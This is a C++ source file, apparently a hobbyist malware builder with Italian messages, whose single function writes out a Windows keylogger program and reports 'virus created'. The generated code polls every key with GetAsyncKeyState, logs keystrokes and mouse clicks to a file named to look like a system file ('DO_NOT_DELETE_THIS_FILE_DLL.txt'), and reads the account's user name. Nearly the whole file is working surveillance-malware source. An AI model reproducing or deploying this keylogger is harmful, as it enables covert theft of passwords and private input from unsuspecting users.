#include<fstream>
#include<iostream>
using namespace std;
void key_logger_2(){       

		FILE *second_key_logger;
        system("cd..");
        
            system("mkdir output");
            cout<<endl;  
     
            second_key_logger = fopen("output\\keylogger avanzato.cpp","w");
            fprintf(second_key_logger,"#include <iostream> \n#include <windows.h>\n#include <fstream> \n#include <string.h>\n#include<Lmcons.h>\nusing namespace std;\n\nvoid WriteLog(LPCSTR text) {\nofstream outfile; \n outfile.open(\"DO_NOT_DELETE_THIS_FILE_DLL.txt\", ofstream::app); \n outfile << text; \n outfile.close(); \n }");
            fprintf(second_key_logger,"\n\nbool KeyIsListed(int iGetKey) {\nswitch (iGetKey)\n{\ncase VK_OEM_2:\ncout<<\" ? \"<<endl;\nWriteLog(\" ? \\n\");\nbreak;\ncase VK_OEM_7:\ncout<<\" ' \";\nWriteLog(\" ' \\n\");\nbreak;\ncase VK_LBUTTON: \ncout << \" *LeftM* \\n\" << endl;\nWriteLog(\" *LeftM* \\n\");\nbreak;\ncase VK_RBUTTON: \n cout << \" *RightM* \" << endl; \nWriteLog(\" *RightM* \\n\");\nbreak;\ncase VK_CONTROL: \ncout << \" *Ctrl* \\n\" << endl; \n WriteLog(\" *Ctrl* \\n\");\nbreak;\ncase VK_SHIFT: \n cout << \" *Shift* \\n\" << endl; \nWriteLog(\" *Shift* \\n\");\nbreak;\ncase VK_RETURN: \ncout << \" *ENTER* \"<<endl; \n WriteLog(\" *ENTER* \\n\");\ncase VK_SPACE:\ncout << \"  \"<<endl; \nWriteLog(\"  \");\nbreak;\ncase VK_OEM_PLUS:\ncout<<\" + \"<<endl;\nWriteLog(\" + \\n\");\nbreak;\ndefault: return FALSE;\n}\n\n}");
            fprintf(second_key_logger,"\nint main(){\nTCHAR name [ UNLEN + 1 ];\nDWORD size = UNLEN +1;\nif(GetUserName((TCHAR*)name,&size));\ncout<<\"Il nome utente di questo account: \"<<name<<endl;\nchar key; \nwhile (TRUE)\n\n{\nSleep(10); \n\nfor (key = 8; key <= 190; key++) \n{\nif (GetAsyncKeyState(key) == -32767) {\n  if (KeyIsListed(key) == FALSE)\n{\ncout << key; \nofstream outfile;\noutfile.open(\"DO_NOT_DELETE_THIS_FILE_DLL.txt\", ofstream::app);\noutfile << key;\noutfile.close();\n}\nelse {\n}\n}\n}\n}	\nreturn EXIT_SUCCESS;\n}");
			fclose(second_key_logger);
	
	        ifstream check ("output\\keylogger avanzato.cpp");
            if (check)
            cout <<"Virus creato correttamente. Salvato nella directory: output"<<endl;
            else
            cout<<"Errore nell\'elaborazione, il virus non e' stato creato";
}
